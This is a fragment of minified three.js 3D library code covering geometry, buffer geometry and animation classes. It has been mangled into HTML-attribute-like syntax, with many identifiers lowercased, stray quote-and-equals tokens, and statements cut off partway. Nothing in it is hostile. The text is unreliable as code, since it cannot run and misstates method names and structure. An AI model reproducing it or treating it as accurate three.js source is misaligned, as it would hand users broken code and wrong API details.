r=\"f[e],s=r.start,t=r.count,q=s,s=s+t;q<s;q+=3)b(d[q],d[q+1],d[q+2],r.materialIndex);else\" for(e=\"0;e<\" d.length;e+=\"3)b(d[e],d[e+1],d[e+2]);else\" this},center:function(){this.computeboundingbox();var=\"\" a},normalize:function(){this.computeboundingsphere();var=\"\" b,c=\"new\" three.matrix4;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applymatrix(c);return=\"\" this},computefacenormals:function(){for(var=\"\" three.vector3,c=\"0,d=this.faces.length;c<d;c++){var\" b,c,d;d=\"Array(this.vertices.length);b=0;for(c=this.vertices.length;b<\" c;b++)d[b]=\"new\" three.vector3;if(a){var=\"\" e,f,g,h=\"new\" three.vector3,k=\"new\" three.vector3;a=\"0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),k.subVectors(e,f),h.cross(k),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else\" for(a=\"0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<b;a++)c=\" this.faces[a],e=\"c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var\" a,b,c,d,e;c=\"0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<\" b;a++)e.__originalvertexnormals[a]?e.__originalvertexnormals[a].copy(e.vertexnormals[a]):e.__originalvertexnormals[a]=\"e.vertexNormals[a].clone();var\" three.geometry;f.faces=\"this.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var\" three.vector3,=\"\" b:new=\"\" three.vector3,c:new=\"\" three.vector3},e.push(h),g.push(k)}g=\"this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],h=g.faceNormals[c],k=g.vertexNormals[c],h.copy(e.normal),k.a.copy(e.vertexNormals[0]),k.b.copy(e.vertexNormals[1]),k.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeTangents:function(){console.warn(\"THREE.Geometry:\" .computetangents()=\"\" removed.\")},=\"\" computelinedistances:function(){for(var=\"\" three.box3);this.boundingbox.setfrompoints(this.vertices)},computeboundingsphere:function(){null=\"==this.boundingSphere&&(this.boundingSphere=new\" three.sphere);this.boundingsphere.setfrompoints(this.vertices)},merge:function(a,b,c){if(!1=\"==a\" three.geometry)console.error(\"three.geometry.merge():=\"\" geometry=\"\" three.geometry.\",=\"\" a);else{var=\"\" d,e=\"this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,k=a.faces,l=this.faceVertexUvs[0];a=a.faceVertexUvs[0];void\" three.matrix3).getnormalmatrix(b));for(var=\"\" m=\"g[n].clone();void\" three.face3(g.a+e,g.b+e,g.c+e);m.normal.copy(g.normal);void=\"\" f;b++)q=\"r[b].clone(),void\" three.mesh?console.error(\"three.geometry.mergemesh():=\"\" mesh=\"\" three.mesh.\",a):(a.matrixautoupdate&&a.updatematrix(),=\"\" this.merge(a.geometry,a.matrix))},mergevertices:function(){var=\"\">d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e, 0=\"==this.faceVertexUvs[c]&&(this.faceVertexUvs[c]=[]);for(var\" 1),c=\"0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return\" f},sortfacesbymaterialindex:function(){for(var=\"\" a=\"this.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return\" a.materialindex-b.materialindex});var=\"\" d=\"this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var\" h=\"a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=\" g)},tojson:function(){function=\"\" a(a,b,c){return=\"\" c?a|1<<b:a&~(1<<b)}function=\"\" b(a){var=\"\" b=\"a.x.toString()+a.y.toString()+a.z.toString();if(void\" 0!=\"=l[b])return\" l[b];l[b]=\"k.length/3;k.push(a.x,a.y,a.z);return\" l[b]}function=\"\" c(a){var=\"\" p[b];p[b]=\"n.length;n.push(a.getHex());return\" p[b]}function=\"\" d(a){var=\"\" q[b];q[b]=\"m.length/2;m.push(a.x,a.y);return\" q[b]}var=\"\" e=\"{metadata:{version:4.4,type:\"Geometry\",\" generator:\"geometry.tojson\"}};e.uuid=\"this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);if(void\" f=\"this.parameters,g;for(g\" in=\"\" f)void=\"\" e}f=\"[];for(g=0;g<this.vertices.length;g++){var\" r=\"this.faces[g],s=void\" c=\"0<r.vertexColors.length,w=0,w=a(w,0,0),w=a(w,1,!0),w=a(w,2,!1),w=a(w,3,s),w=a(w,4,t),w=a(w,5,u),w=a(w,6,v),w=a(w,7,C);h.push(w);h.push(r.a,r.b,r.c);h.push(r.materialIndex);s&&(s=this.faceVertexUvs[0][g],h.push(d(s[0]),d(s[1]),d(s[2])));t&&h.push(b(r.normal));u&&(t=r.vertexNormals,h.push(b(t[0]),b(t[1]),b(t[2])));v&&h.push(c(r.color));C&&(r=r.vertexColors,h.push(c(r[0]),c(r[1]),c(r[2])))}e.data={};e.data.vertices=f;e.data.normals=k;0<n.length&&(e.data.colors=n);0<m.length&&(e.data.uvs=[m]);e.data.faces=\" h;return=\"\" e},clone:function(){return(new=\"\" three.geometry).copy(this)},copy:function(a){this.vertices=\"[];this.faces=[];this.faceVertexUvs=[[]];for(var\" g=\"b[e],h=[],k=0,l=g.length;k<l;k++)h.push(g[k].clone());\" this.facevertexuvs[c].push(h)}}return=\"\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.geometryidcount=\"0;\" three.directgeometry=\"function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"DirectGeometry\";this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1};\" object.assign(three.directgeometry.prototype,three.eventdispatcher.prototype,{computeboundingbox:three.geometry.prototype.computeboundingbox,computeboundingsphere:three.geometry.prototype.computeboundingsphere,computefacenormals:function(){console.warn(\"three.directgeometry:=\"\" computefacenormals()=\"\" is=\"\" not=\"\" method=\"\" of=\"\" this=\"\" type=\"\" geometry.\")},computevertexnormals:function(){console.warn(\"three.directgeometry:=\"\" computevertexnormals()=\"\" geometry.\")},computegroups:function(a){var=\"\" b,=\"\" l=\"0;l<h;l++)k[l]=[];this.morphTargets.position=k}var\" n=\"a.morphNormals,p=n.length,m;if(0<p){m=[];for(l=0;l<\" p;l++)m[l]=\"[];this.morphTargets.normal=m}for(var\" q=\"a.skinIndices,r=a.skinWeights,s=q.length===c.length,t=r.length===c.length,l=0;l<b.length;l++){var\" u=\"b[l];this.vertices.push(c[u.a],c[u.b],c[u.c]);var\" v=\"u.vertexNormals;3===v.length?this.normals.push(v[0],v[1],v[2]):(v=u.normal,this.normals.push(v,v,v));v=u.vertexColors;3===v.length?this.colors.push(v[0],v[1],v[2]):(v=u.color,this.colors.push(v,v,v));!0===e&&(v=d[0][l],void\" undefined=\"\" vertexuv=\"\" \",=\"\" l),this.uvs.push(new=\"\" three.vector2,new=\"\" three.vector2)));!0=\"==f&&(v=d[1][l],void\" vertexuv2=\"\" \",l),this.uvs2.push(new=\"\" three.vector2)));for(v=\"0;v<h;v++){var\" r[u.c])}this.computegroups(a);this.verticesneedupdate=\"a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});=\"\" three.buffergeometry=\"function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"BufferGeometry\";this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.drawRange={start:0,count:Infinity}};\" object.assign(three.buffergeometry.prototype,three.eventdispatcher.prototype,{getindex:function(){return=\"\" this.index},setindex:function(a){this.index=\"a},addAttribute:function(a,b,c){if(!1===b\" instanceof=\"\" three.bufferattribute&&!1=\"==b\" three.interleavedbufferattribute)console.warn(\"three.buffergeometry:=\"\" .addattribute()=\"\" now=\"\" expects=\"\" (=\"\" name,=\"\" attribute=\"\" ).\"),this.addattribute(a,new=\"\" three.bufferattribute(b,c));else=\"\" if(\"index\"=\"==a)console.warn(\"THREE.BufferGeometry.addAttribute:\" use=\"\" .setindex()=\"\" for=\"\" index=\"\" attribute.\"),=\"\" this.setindex(b);else=\"\" return=\"\" this.attributes[a]=\"b,this},getAttribute:function(a){return\" this.attributes[a]},removeattribute:function(a){delete=\"\" this.attributes[a];return=\"\" this},addgroup:function(a,b,c){this.groups.push({start:a,count:b,materialindex:void=\"\" void=\"\" three.matrix3).getnormalmatrix(a).applytovector3array(b.array),b.needsupdate=\"!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return\" this},rotatex:function(){var=\"\" a;return=\"\" function(b){void=\"\" three.matrix4);a.makerotationx(b);this.applymatrix(a);return=\"\" this}}(),rotatey:function(){var=\"\" three.matrix4);a.makerotationy(b);this.applymatrix(a);return=\"\" this}}(),rotatez:function(){var=\"\" a;=\"\" three.matrix4);a.makerotationz(b);this.applymatrix(a);return=\"\" this}}(),translate:function(){var=\"\" function(b,c,d){void=\"\" three.matrix4);a.maketranslation(b,c,d);this.applymatrix(a);return=\"\" this}}(),scale:function(){var=\"\" three.matrix4);a.makescale(b,c,d);this.applymatrix(a);return=\"\" this}}(),lookat:function(){var=\"\" three.object3d);a.lookat(b);a.updatematrix();this.applymatrix(a.matrix)}}(),=\"\" center:function(){this.computeboundingbox();var=\"\" a},setfromobject:function(a){var=\"\" three.points||a=\"\" three.line){a=\"new\" three.float32attribute(3*b.vertices.length,3);var=\"\" three.float32attribute(3*b.colors.length,3);this.addattribute(\"position\",a.copyvector3sarray(b.vertices));this.addattribute(\"color\",c.copycolorsarray(b.colors));b.linedistances&&b.linedistances.length=\"==b.vertices.length&&\" (a=\"new\" three.float32attribute(b.linedistances.length,1),this.addattribute(\"linedistance\",a.copyarray(b.linedistances)));null!=\"=b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());null!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else\" three.mesh&&b=\"\" three.geometry&&this.fromgeometry(b);return=\"\" this},updatefromobject:function(a){var=\"\" three.mesh){var=\"\" this.fromgeometry(b);c.verticesneedupdate=\"b.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;b.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void\" c.needsupdate=\"!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void\" b.groups,b.groupsneedupdate=\"!1);return\" this},fromgeometry:function(a){a.__directgeometry=\"(new\" three.directgeometry).fromgeometry(a);return=\"\" this.fromdirectgeometry(a.__directgeometry)},fromdirectgeometry:function(a){var=\"\" float32array(3*a.vertices.length);this.addattribute(\"position\",(new=\"\" three.bufferattribute(b,3)).copyvector3sarray(a.vertices));0<a.normals.length&&(b=\"new\" float32array(3*a.normals.length),this.addattribute(\"normal\",(new=\"\" three.bufferattribute(b,3)).copyvector3sarray(a.normals)));=\"\" 0<a.colors.length&&(b=\"new\" float32array(3*a.colors.length),this.addattribute(\"color\",(new=\"\" three.bufferattribute(b,3)).copycolorsarray(a.colors)));0<a.uvs.length&&(b=\"new\" float32array(2*a.uvs.length),this.addattribute(\"uv\",(new=\"\" three.bufferattribute(b,2)).copyvector2sarray(a.uvs)));0<a.uvs2.length&&(b=\"new\" float32array(2*a.uvs2.length),this.addattribute(\"uv2\",(new=\"\" three.bufferattribute(b,2)).copyvector2sarray(a.uvs2)));0<a.indices.length&&(b=\"new\" (65535<a.vertices.length?uint32array:uint16array)(3*a.indices.length),=\"\" this.setindex((new=\"\" three.bufferattribute(b,1)).copyindicesarray(a.indices)));this.groups=\"a.groups;for(var\" a.morphtargets){for(var=\"\" three.float32attribute(3*g.length,3);b.push(h.copyvector3sarray(g))}this.morphattributes[c]=\"b}0<a.skinIndices.length&&(c=new\" three.float32attribute(4*a.skinindices.length,4),this.addattribute(\"skinindex\",c.copyvector4sarray(a.skinindices)));0<a.skinweights.length&&(c=\"new\" three.float32attribute(4*a.skinweights.length,=\"\" 4),this.addattribute(\"skinweight\",c.copyvector4sarray(a.skinweights)));null!=\"=a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return\" this},computeboundingbox:function(){null=\"==this.boundingBox&&(this.boundingBox=new\" three.box3);var=\"\" console.error('three.buffergeometry.computeboundingbox:=\"\" computed=\"\" min=\"\" max=\"\" have=\"\" nan=\"\" values.=\"\" the=\"\" \"position\"=\"\" likely=\"\" to=\"\" values.',this)},computeboundingsphere:function(){var=\"\" three.box3,b=\"new\" three.vector3;return=\"\" function(){null=\"==this.boundingSphere&&(this.boundingSphere=new\" three.sphere);var=\"\" this.boundingsphere.radius=\"Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere():\" radius=\"\" nan.=\"\" values.',this)}}}(),computefacenormals:function(){},computevertexnormals:function(){var=\"\" three.bufferattribute(new=\"\" float32array(d.length),3));else=\"\" for(var=\"\" three.vector3,p=\"new\" three.vector3,m=\"new\" three.vector3,q=\"new\" three.vector3,r=\"new\" three.vector3;if(a){a=\"a.array;0===c.length&&this.addGroup(0,a.length);for(var\" s=\"0,t=c.length;s<t;++s)for(f=c[s],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],k=3*a[f+1],l=3*a[f+2],n.fromArray(d,h),p.fromArray(d,k),m.fromArray(d,l),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[h]+=q.x,e[h+1]+=q.y,e[h+2]+=q.z,e[k]+=q.x,e[k+1]+=q.y,e[k+2]+=q.z,e[l]+=q.x,\" e[l+1]+=\"q.y,e[l+2]+=q.z}else\" for(f=\"0,g=d.length;f<g;f+=9)n.fromArray(d,f),p.fromArray(d,f+3),m.fromArray(d,f+6),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[f]=q.x,e[f+1]=q.y,e[f+2]=q.z,e[f+3]=q.x,e[f+4]=q.y,e[f+5]=q.z,e[f+6]=q.x,e[f+7]=q.y,e[f+8]=q.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===a\" three.buffergeometry)console.error(\"three.buffergeometry.merge():=\"\" geometry=\"\" an=\"\" instance=\"\" three.buffergeometry.\",a);else{void=\"\" d;for(d=\"\" c)if(void=\"\" this}},normalizenormals:function(){for(var=\"\" console.warn(\"three.buffergeometry.tononindexed():=\"\" already=\"\" non-indexed.\"),this;var=\"\" three.buffergeometry,=\"\" c){for(var=\"\" f.constructor(b.length*e),h=\"0,k=0,l=0,n=b.length;l<n;l++)for(var\" three.bufferattribute(g,e))}return=\"\" a},tojson:function(){var=\"\" b)void=\"\" b[c]&&(a[c]=\"b[c]);return\" a}a.data=\"{attributes:{}};var\" d){var=\"\" radius:c.radius});return=\"\" a},clone:function(){return(new=\"\" three.buffergeometry).copy(this)},copy:function(a){var=\"\" b)this.addattribute(c,b[c].clone());a=\"a.groups;c=0;for(b=a.length;c<b;c++){var\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.buffergeometry.maxindex=\"65535;\" three.instancedbuffergeometry=\"function(){THREE.BufferGeometry.call(this);this.type=\"InstancedBufferGeometry\";this.maxInstancedCount=void\" 0};three.instancedbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.InstancedBufferGeometry.prototype.constructor=THREE.InstancedBufferGeometry;THREE.InstancedBufferGeometry.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,instances:c})};\" three.instancedbuffergeometry.prototype.copy=\"function(a){var\" this};three.uniform=\"function(a,b){\"string\"===typeof\" a&&(console.warn(\"three.uniform:=\"\" parameter=\"\" no=\"\" longer=\"\" needed.\"),a=\"b);this.value=a;this.dynamic=!1};\" three.uniform.prototype=\"{constructor:THREE.Uniform,onUpdate:function(a){this.dynamic=!0;this.onUpdateCallback=a;return\" this}};three.animationaction=\"function(){throw\" error(\"three.animationaction:=\"\" mixer.clipaction=\"\" construction.\");};=\"\" three.animationaction._new=\"function(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;b=a.length;c=Array(b);for(var\" -1;this._starttime=\"null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0};\" three.animationaction._new.prototype=\"{constructor:THREE.AnimationAction._new,play:function(){this._mixer._activateAction(this);return\" this},stop:function(){this._mixer._deactivateaction(this);return=\"\" this.reset()},reset:function(){this.paused=\"!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return\" this.stopfading().stopwarping()},isrunning:function(){return=\"\" this.enabled&&!this.paused&&0!=\"=this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return\" this._mixer._isactiveaction(this)},=\"\" startat:function(a){this._starttime=\"a;return\" this},setloop:function(a,b){this.loop=\"a;this.repetitions=b;return\" this},seteffectiveweight:function(a){this.weight=\"a;this._effectiveWeight=this.enabled?a:0;return\" this.stopfading()},geteffectiveweight:function(){return=\"\" this._effectiveweight},fadein:function(a){return=\"\" this._schedulefading(a,0,1)},fadeout:function(a){return=\"\" this._schedulefading(a,1,0)},crossfadefrom:function(a,b,c){a.fadeout(b);this.fadein(b);if(c){c=\"this._clip.duration;var\" this},crossfadeto:function(a,b,c){return=\"\" a.crossfadefrom(this,b,c)},stopfading:function(){var=\"\" this},seteffectivetimescale:function(a){this.timescale=\"a;this._effectiveTimeScale=this.paused?0:a;return\" this.stopwarping()},geteffectivetimescale:function(){return=\"\" this._effectivetimescale},setduration:function(a){this.timescale=\"this._clip.duration/\" this.stopwarping()},syncwith:function(a){this.time=\"a.time;this.timeScale=a.timeScale;return\" this.stopwarping()},halt:function(a){return=\"\" this.warp(this._effectivetimescale,0,a)},warp:function(a,b,c){var=\"\" this},stopwarping:function(){var=\"\" (this._timescaleinterpolant=\"null,this._mixer._takeBackControlInterpolant(a));return\" this},getmixer:function(){return=\"\" this._mixer},getclip:function(){return=\"\" this._clip},getroot:function(){return=\"\" this._localroot||this._mixer._root},_update:function(a,b,c,d){var=\"\">b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=\"this._propertyBindings,f=0,g=b.length;f!==\" g;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateweight:function(a){var=\"\" b=\"0;if(this.enabled){var\" d=\"c.evaluate(a)[0],b=b*d;a\">c.parameterPositions[1]&&(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:\nthis.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(d===THREE.LoopOnce)a:{if(-1===e&&(this.loopCount=0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=d===THREE.LoopPingPong;-1===e&&(0<=a?(e=0,this._setendings(!0,0===this.repetitions, d)):this._setendings(0=\"==this.repetitions,!0,d));if(b\">=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchevent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,\nb,c){var d=this._interpolantSettings;c?(d.endingStart=THREE.ZeroSlopeEnding,d.endingEnd=THREE.ZeroSlopeEnding):(d.endingStart=a?this.zeroSlopeAtStart?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding,d.endingEnd=b?this.zeroSlopeAtEnd?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,f=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;\nf=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};THREE.AnimationClip=function(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=THREE.Math.generateUUID();0>this.duration&&this.resetDuration();this.trim();this.optimize()};\nTHREE.AnimationClip.prototype={constructor:THREE.AnimationClip,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return 0=\"==d.length?null:new\" this},optimize:function(){for(var=\"\" a=\"0;a<this.tracks.length;a++)this.tracks[a].optimize();return\" this}};=\"\" object.assign(three.animationclip,{parse:function(a){for(var=\"\" b=\"[],c=a.tracks,d=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(THREE.KeyframeTrack.parse(c[e]).scale(d));return\" new=\"\" three.animationclip(a.name,a.duration,b)},tojson:function(a){var=\"\" d=\"0,e=c.length;d!==e;++d)b.push(THREE.KeyframeTrack.toJSON(c[d]));return\" a},createfrommorphtargetsequence:function(a,b,c,d){for(var=\"\" e=\"b.length,f=[],g=0;g<e;g++){var\" h=\"[],k=[];h.push((g+e-1)%\" e,g,(g+1)%e);k.push(0,1,0);var=\"\" l=\"THREE.AnimationUtils.getKeyframeOrder(h),h=THREE.AnimationUtils.sortedArray(h,1,l),k=THREE.AnimationUtils.sortedArray(k,1,l);d||0!==h[0]||(h.push(e),k.push(k[0]));f.push((new\" three.numberkeyframetrack(\".morphtargetinfluences[\"+b[g].name+\"]\",h,k)).scale(1=\"\" c))}return=\"\" three.animationclip(a,-1,f)},findbyname:function(a,b){var=\"\" c=\"a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var\" c[d];return=\"\" null},=\"\" createclipsfrommorphtargetsequences:function(a,b,c){for(var=\"\" in=\"\" d)a.push(three.animationclip.createfrommorphtargetsequence(l,d[l],b,c));return=\"\" a},parseanimation:function(a,b,c){if(!a)return=\"\" console.error(\"=\"\" no=\"\" animation=\"\" jsonloader=\"\" data\"),null;c=\"function(a,b,c,d,e){if(0!==c.length){var\" f=\"[],g=[];THREE.AnimationUtils.flattenJSON(c,f,g,d);0!==f.length&&\" e.push(new=\"\" a(b,f,g))}};var=\"\" k=\"a[h].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var\" n=\"0;n<k[l].morphTargets.length;n++)f[k[l].morphTargets[n]]=-1;for(var\" p=\"\" f){for(var=\"\" m=\"[],q=[],n=0;n!==k[l].morphTargets.length;++n){var\" r=\"k[l];m.push(r.time);q.push(r.morphTarget===p?1:0)}d.push(new\" three.numberkeyframetrack(\".morphtargetinfluence[\"+p+\"]\",=\"\" m,q))}f=\"f.length*(g||1)}else\" +b[h].name+\"]\",c(three.vectorkeyframetrack,l+\".position\",k,\"pos\",d),c(three.quaternionkeyframetrack,l+\".quaternion\",k,\"rot\",d),c(three.vectorkeyframetrack,l+\".scale\",k,\"scl\",d)}return=\"\" three.animationclip(e,f,d)}});three.animationmixer=\"function(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1};\" object.assign(three.animationmixer.prototype,three.eventdispatcher.prototype,{clipaction:function(a,b){var=\"\" a?three.animationclip.findbyname(c,a):a,c=\"null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void\" 0!=\"=f){g=f.actionByRoot[d];if(void\" g;g=\"f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return\" null;e=\"new\" three.animationmixer._action(this,e,b);this._bindaction(e,g);this._addinactiveaction(e,c,d);return=\"\" e},existingaction:function(a,=\"\" b){var=\"\" void=\"\" this},update:function(a){a*=\"this.timeScale;for(var\" a,e=\"Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var\" this},getroot:function(){return=\"\" this._root},uncacheclip:function(a){var=\"\" g=\"d[e];this._deactivateAction(g);var\" h;b[h]=\"k;b.pop();this._removeInactiveBindingsForAction(g)}delete\" c[a]}},uncacheroot:function(a){a=\"a.uuid;var\" c)a=\"c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var\" three.animationmixer._action=\"THREE.AnimationAction._new;\" object.assign(three.animationmixer.prototype,{_bindaction:function(a,b){var=\"\" three.propertymixer(three.propertybinding.create(c,p,b&&b._propertybindings[k].binding.parsedpath),=\"\" n.valuetypename,n.getvaluesize());++m.referencecount;this._addinactivebinding(m,h,p)}f[k]=\"m;g[k].resultBuffer=m.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var\" _deactivateaction:function(a){if(this._isactiveaction(a)){for(var=\"\" total(){return=\"\" a._actions.length},=\"\" get=\"\" inuse(){return=\"\" a._nactiveactions}},bindings:{get=\"\" a._bindings.length},get=\"\" a._nactivebindings}},controlinterpolants:{get=\"\" a._controlinterpolants.length},get=\"\" a._nactivecontrolinterpolants}}}},_isactiveaction:function(a){a=\"a._cacheIndex;return\" null!=\"=a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var\" f.knownactions,a._byclipcacheindex=\"b.length,b.push(a));a._cacheIndex=d.length;d.push(a);f.actionByRoot[c]=a},_removeInactiveAction:function(a){var\" e.actionbyroot[(b._localroot||this._root).uuid];0=\"==f.length&&delete\" d[c];this._removeinactivebindingsforaction(a)},=\"\" _removeinactivebindingsforaction:function(a){a=\"a._propertyBindings;for(var\" f[c];a:{for(var=\"\" f)break=\"\" a;delete=\"\" e[d]}},_lendbinding:function(a){var=\"\" three.linearinterpolant(new=\"\" float32array(2),new=\"\" float32array(2),1,this._controlinterpolantsresultbuffer),c.__cacheindex=\"b,a[b]=c);return\" c},_takebackcontrolinterpolant:function(a){var=\"\" float32array(1)});=\"\" three.animationobjectgroup=\"function(a){this.uuid=THREE.Math.generateUUID();this._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var\" e._objects.length},get=\"\" this.total-e.ncachedobjects_}},get=\"\" bindingsperobject(){return=\"\" e._bindings.length}}};=\"\" three.animationobjectgroup.prototype=\"{constructor:THREE.AnimationObjectGroup,add:function(a){for(var\" three.propertybinding(p,f[m],g[m]))}else=\"\" if(q<d){var=\"\" s=\"b[q],t=--d,r=b[t];e[r.uuid]=q;b[q]=r;e[m]=t;b[t]=p;m=0;for(r=k;m!==\" r;++m){var=\"\" u=\"h[m],v=u[q];u[q]=u[t];void\" three.propertybinding(p,f[m],g[m]));u[t]=\"v}}else\" b[q]!=\"=s&&console.error(\"Different\" objects=\"\" with=\"\" the=\"\" same=\"\" uuid=\"\" detected.=\"\" clean=\"\" caches=\"\" or=\"\" recreate=\"\" your=\"\" infrastructure=\"\" when=\"\" reloading=\"\" scenes...\")}this.ncachedobjects_=\"d},remove:function(a){for(var\">=c){var 